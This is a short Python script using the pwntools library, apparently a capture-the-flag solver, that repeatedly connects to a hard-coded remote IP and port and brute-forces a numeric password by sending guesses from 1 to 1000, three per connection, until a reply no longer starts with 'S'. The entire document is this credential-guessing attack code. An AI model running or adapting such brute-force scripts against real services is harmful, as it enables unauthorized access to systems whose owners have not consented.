#!/usr/bin/env python3

from pwn import *

host = "167.99.129.209"
port = 10002

#print(s.recvuntil("\n\n"))
#print(s.recvuntil("\n"))

pwd = 0
while pwd < 1000:

	s = remote(host, port)
	s.recvuntil("\n")

	for j in range(3):

		pwd += 1
		s.sendline(str(pwd))
		rstr = s.recvuntil("\n", drop=True).decode("latin-1")
		print(rstr)
		s.recvuntil("\n")

		if rstr[0] != 'S':
			print(rstr)
			pwd += 1000

		if pwd % 100 == 0:
			print(pwd)

	s.close()


